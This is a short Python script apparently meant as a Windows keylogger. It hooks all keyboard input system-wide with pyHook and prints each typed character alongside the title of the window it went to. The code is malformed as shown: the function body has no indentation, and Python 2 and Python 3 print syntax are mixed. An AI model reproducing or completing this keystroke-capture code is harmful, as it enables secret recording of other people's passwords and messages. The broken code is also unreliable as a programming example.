from ctypes import *

import pyHook

import pythoncom

print('start hook...')

def onKeyboardEvent(event):

print('--------------------------------------------')

windowTitle = create_string_buffer(512)

windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)

windowName = windowTitle.value.decode('GBK')

print "windowName: " + windowName

print "code: " + chr(event.Ascii)

return True

hm = pyHook.HookManager()

hm.KeyDown = onKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()